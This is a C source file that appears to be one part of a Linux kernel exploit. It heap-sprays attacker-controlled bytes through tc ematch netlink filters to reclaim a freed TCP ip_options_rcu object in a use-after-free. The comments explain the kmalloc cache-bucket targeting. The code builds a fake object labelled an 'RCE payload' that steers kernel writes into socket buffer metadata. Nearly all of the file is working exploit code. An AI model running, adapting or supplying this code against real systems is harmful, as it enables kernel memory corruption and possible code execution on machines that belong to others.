/* emspray.c - reclaim the freed ip_options_rcu with ATTACKER-CONTROLLED bytes.
 *
 * Why this works:
 *   - The vulnerable free is kfree() of a 72-byte ip_options_rcu
 *     (kmalloc(32+optlen) from tcp_v4_save_options).
 *   - CONFIG_RANDOM_KMALLOC_CACHES=y splits kmalloc-96 into 16 caches selected
 *     by hash_64(_RET_IP_ ^ random_kmalloc_seed, 4).  tcp_v4_save_options' call
 *     site lives in bucket 5.  Only an allocation whose _RET_IP_ hashes to the
 *     SAME bucket can ever reuse the freed slot.
 *   - tcf_em_validate() (net/sched/ematch.c) does
 *         kmemdup(data, data_len, GFP_KERNEL)
 *     for ematch kinds without a ->change handler (TCF_EM_CMP, TCF_EM_U32).
 *     Its call site (tcf_em_validate+0x104) settles in bucket 5 too, the size
 *     is attacker-chosen (>= sizeof(struct tcf_em_cmp)) and every byte is
 *     copied verbatim.  Allocated in process context, non-accounted,
 *     persistent while the filter exists.
 *
 * The fake ip_options_rcu layout (object offsets):
 *   24 optlen | 25 srr | 26 rr | 27 ts | 28 flags | 32.. __data
 * ip_options_build() then:
 *   memcpy(iph+20, __data, optlen)                 -> SYN-ACK options
 *   if (rr_needaddr) ip_rt_get_source(iph + rr + iph[rr+2] - 5, ...)
 *        write offset = rr + (byte at object 32 + rr - 18) - 5
 *   if (srr) memcpy(iph + srr + iph[srr+1] - 4, &daddr, 4)
 *
 * Usage: sudo ./emspray <runtime_s> [cpu] [ptr_byte]
 *   ptr_byte controls the RR write offset: iph + rr + ptr - 5.
 */
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <linux/if_ether.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/pkt_cls.h>
#include <linux/pkt_sched.h>
#include <net/if.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#ifndef TCA_BASIC_EMATCHES
#define TCA_BASIC_UNSPEC 0
#define TCA_BASIC_CLASSID 1
#define TCA_BASIC_EMATCHES 2
#define TCA_BASIC_ACT 3
#define TCA_BASIC_POLICE 4
#endif

#define PAYLOAD_LEN 76
#define WINDOW      4096

static unsigned char g_payload[PAYLOAD_LEN];

static int addattr_l(struct nlmsghdr *n, int maxlen, int type,
                     const void *data, int alen) {
    int len = RTA_LENGTH(alen);
    struct rtattr *rta;
    if ((int)NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len) > maxlen) return -1;
    rta = (struct rtattr *)((char *)n + NLMSG_ALIGN(n->nlmsg_len));
    rta->rta_type = type;
    rta->rta_len = len;
    if (alen) memcpy(RTA_DATA(rta), data, alen);
    n->nlmsg_len = NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len);
    return 0;
}

static struct rtattr *addattr_nest(struct nlmsghdr *n, int maxlen, int type) {
    struct rtattr *nest =
        (struct rtattr *)((char *)n + NLMSG_ALIGN(n->nlmsg_len));
    addattr_l(n, maxlen, type, NULL, 0);
    return nest;
}

static void addattr_nest_end(struct nlmsghdr *n, struct rtattr *nest) {
    nest->rta_len = (char *)n + NLMSG_ALIGN(n->nlmsg_len) - (char *)nest;
}

static int nl_talk(int fd, struct nlmsghdr *n) {
    struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
    struct iovec iov = {n, n->nlmsg_len};
    struct msghdr msg = {&nladdr, sizeof(nladdr), &iov, 1, NULL, 0, 0};
    char buf[4096];
    if (sendmsg(fd, &msg, 0) < 0) return -errno;
    for (;;) {
        struct iovec riov = {buf, sizeof(buf)};
        struct msghdr rmsg = {&nladdr, sizeof(nladdr), &riov, 1, NULL, 0, 0};
        int len = recvmsg(fd, &rmsg, 0);
        if (len < 0) return -errno;
        for (struct nlmsghdr *h = (struct nlmsghdr *)buf; NLMSG_OK(h, len);
             h = NLMSG_NEXT(h, len)) {
            if (h->nlmsg_type == NLMSG_ERROR) {
                struct nlmsgerr *e = NLMSG_DATA(h);
                return e->error;
            }
        }
    }
}

static int ifindex_dev;

static int add_qdisc(int fd) {
    char req[512];
    memset(req, 0, sizeof(req));
    struct nlmsghdr *n = (struct nlmsghdr *)req;
    n->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    n->nlmsg_type = RTM_NEWQDISC;
    n->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
    struct tcmsg *t = NLMSG_DATA(n);
    t->tcm_family = AF_UNSPEC;
    t->tcm_ifindex = ifindex_dev;
    t->tcm_handle = TC_H_MAKE(TC_H_CLSACT, 0);
    t->tcm_parent = TC_H_CLSACT;
    addattr_l(n, sizeof(req), TCA_KIND, "clsact", 7);
    return nl_talk(fd, n);
}

static int filter_msg(int fd, int add, unsigned int handle) {
    char req[1024];
    memset(req, 0, sizeof(req));
    struct nlmsghdr *n = (struct nlmsghdr *)req;
    n->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    n->nlmsg_type = add ? RTM_NEWTFILTER : RTM_DELTFILTER;
    n->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    if (add) n->nlmsg_flags |= NLM_F_CREATE | NLM_F_EXCL;
    struct tcmsg *t = NLMSG_DATA(n);
    t->tcm_family = AF_UNSPEC;
    t->tcm_ifindex = ifindex_dev;
    t->tcm_handle = handle;
    t->tcm_parent = TC_H_MAKE(TC_H_CLSACT, TC_H_MIN_INGRESS);
    t->tcm_info = TC_H_MAKE(1 << 16, htons(ETH_P_ALL));

    if (!add) return nl_talk(fd, n);

    addattr_l(n, sizeof(req), TCA_KIND, "basic", 6);
    struct rtattr *opts = addattr_nest(n, sizeof(req), TCA_OPTIONS);
    struct rtattr *em = addattr_nest(n, sizeof(req), TCA_BASIC_EMATCHES);
    struct tcf_ematch_tree_hdr hdr = {.nmatches = 1, .progid = TCF_EM_PROG_TC};
    addattr_l(n, sizeof(req), TCA_EMATCH_TREE_HDR, &hdr, sizeof(hdr));
    struct rtattr *list = addattr_nest(n, sizeof(req), TCA_EMATCH_TREE_LIST);
    /* ematch attr #1: data = struct tcf_ematch_hdr + payload, verbatim kmemdup */
    {
        char eb[sizeof(struct tcf_ematch_hdr) + PAYLOAD_LEN];
        struct tcf_ematch_hdr eh;
        memset(&eh, 0, sizeof(eh));
        eh.kind = TCF_EM_CMP;
        memcpy(eb, &eh, sizeof(eh));
        memcpy(eb + sizeof(eh), g_payload, PAYLOAD_LEN);
        addattr_l(n, sizeof(req), 1, eb, sizeof(eb));
    }
    addattr_nest_end(n, list);
    addattr_nest_end(n, em);
    addattr_nest_end(n, opts);
    return nl_talk(fd, n);
}

int main(int argc, char **argv) {
    int runtime = argc > 1 ? atoi(argv[1]) : 30;
    int cpu = argc > 2 ? atoi(argv[2]) : 0;
    int ptr = argc > 3 ? (atoi(argv[3]) & 0xff) : 7;
    int rr = argc > 5 ? (atoi(argv[5]) & 0xff) : 26;
    int optlen = argc > 6 ? (atoi(argv[6]) & 0xff) : 40;
    if (rr + 2 > 59) rr = 26;   /* keep iph[rr+2] inside the copied options */
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(cpu, &s);
    sched_setaffinity(0, sizeof(s), &s);

    /* default to the em0 dummy (rce_boot.sh): attaching the filter chain to
     * lo makes every loopback packet traverse it and collapses the storm
     * (AGENTS.md 7b). argv[4] still overrides. */
    const char *devname = argc > 4 ? argv[4] : "em0";
    ifindex_dev = if_nametoindex(devname);
    if (!ifindex_dev) { fprintf(stderr, "no such dev: %s\n", devname); return 1; }

    /* RCE payload (same layout as attr_spray.c; kmemdup = arbitrary bytes):
     *   optlen=40 srr=67 rr=68 ts=69 flags=0x28, faddr=32.32.32.32,
     *   __data = valid TS option, client ISN 0x6D507163 so the SYN-ACK ACK
     *   bytes are 109/113/100 -> the three ip_options_build writes land at
     *   iph+172 (shinfo+8, frag_list low), iph+176 (shinfo+12, frag_list
     *   high), iph+160 (tailroom). The object index == object offset. */
    memset(g_payload, 0x41, sizeof(g_payload));
    g_payload[16] = 32; g_payload[17] = 32; g_payload[18] = 32; g_payload[19] = 32; /* faddr 32.32.32.32 */
    g_payload[24] = 40;    /* optlen */
    g_payload[25] = 67;    /* srr  (write at iph+67+iph[68]-4 = shinfo+8)  */
    g_payload[26] = 68;    /* rr   (write at iph+68+iph[70]-5 = shinfo+12) */
    g_payload[27] = 69;    /* ts   (write at iph+69+iph[71]-9 = tailroom)  */
    g_payload[28] = 0x28;  /* flags: rr_needaddr | ts_needaddr */
    /* __data@+32 = valid TS option (passes RX ip_options_compile) */
    g_payload[32] = 0x44;   /* TS type 0x44 */
    g_payload[33] = 0x28;   /* TS len 40 */
    g_payload[34] = 0x25;   /* TS ptr 37 */
    g_payload[35] = 0x20;   /* TS flags: TSONLY */
    /* rdopt fetch windows: s1 = object[39..42], s3 = object[47..50] */
    g_payload[39] = 0x41; g_payload[40] = 0x42; g_payload[41] = 0x43; g_payload[42] = 0x44;
    g_payload[47] = 0x45; g_payload[48] = 0x46; g_payload[49] = 0x47; g_payload[50] = 0x48;

    int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (fd < 0) { perror("netlink"); return 1; }
    struct sockaddr_nl la = {.nl_family = AF_NETLINK};
    bind(fd, (struct sockaddr *)&la, sizeof(la));

    int rc = add_qdisc(fd);
    if (rc && rc != -EEXIST) fprintf(stderr, "[em] qdisc: %d\n", rc);

    /* module autoload can return -EAGAIN (tcf_em_validate request_module) */
    unsigned int h = 1;
    int added = 0, errs = 0;
    time_t t0 = time(NULL);
    while ((int)(time(NULL) - t0) < runtime) {
        rc = filter_msg(fd, 1, h);
        if (rc == -EAGAIN || rc == -ENOENT) {
            usleep(1000);
            rc = filter_msg(fd, 1, h);
        }
        if (rc == 0) added++;
        else if (rc != -EEXIST) errs++;
        if (h > WINDOW) filter_msg(fd, 0, h - WINDOW);
        h++;
    }
    /* cleanup */
    for (unsigned int i = (h > WINDOW ? h - WINDOW : 1); i <= h; i++)
        filter_msg(fd, 0, i);
    fprintf(stderr, "[em] added=%d errs=%d rr=%d ptr=%d optlen=%d\n", added, errs, rr, ptr, optlen);
    return 0;
}
